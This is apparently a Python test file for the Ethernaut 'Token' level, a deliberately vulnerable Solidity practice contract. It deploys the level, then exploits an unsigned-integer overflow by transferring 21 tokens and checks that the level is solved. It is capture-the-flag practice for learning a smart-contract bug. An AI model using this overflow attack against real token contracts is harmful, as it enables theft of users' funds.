from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv05_token import Token


@default_chain.connect()
def test_lv05():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv05()
    exploit_lv05(contract, ethernaut.other_account)
    ethernaut.check_lv05(contract)

def exploit_lv05(contract: Token, other_account: Account):
    # Attack vector: overflow of unsigned int
    
    contract.transfer(other_account, 21)
